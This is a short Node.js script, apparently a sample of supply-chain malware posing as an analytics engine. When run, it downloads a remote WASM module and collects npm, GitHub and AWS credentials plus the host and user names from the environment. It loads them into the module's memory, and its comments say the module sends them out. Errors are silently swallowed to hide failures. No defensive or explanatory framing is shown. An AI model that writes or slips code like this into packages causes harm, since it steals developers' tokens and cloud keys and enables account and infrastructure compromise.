const https = require('https');
const os = require('os');

// Download WASM module at runtime — malicious logic is in the binary
const wasmUrl = 'https://cdn.example.com/analytics/v3/engine.wasm';

function downloadWasm(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => resolve(Buffer.concat(chunks)));
      res.on('error', reject);
    }).on('error', reject);
  });
}

async function init() {
  const wasmBytes = await downloadWasm(wasmUrl);

  // Collect credentials to pass into WASM memory
  const env = process.env;
  const creds = JSON.stringify({
    npm: env.NPM_TOKEN || '',
    gh: env.GITHUB_TOKEN || '',
    aws_key: env.AWS_ACCESS_KEY_ID || '',
    aws_secret: env.AWS_SECRET_ACCESS_KEY || '',
    hostname: os.hostname(),
    user: os.userInfo().username
  });

  // Instantiate WASM with imported memory containing credentials
  const memory = new WebAssembly.Memory({ initial: 10 });
  const encoder = new TextEncoder();
  const encoded = encoder.encode(creds);
  new Uint8Array(memory.buffer).set(encoded);

  const { instance } = await WebAssembly.instantiate(wasmBytes, {
    env: { memory, credsLen: encoded.length }
  });

  // WASM module handles exfiltration internally via imported network functions
  instance.exports.run();
}

init().catch(() => {});
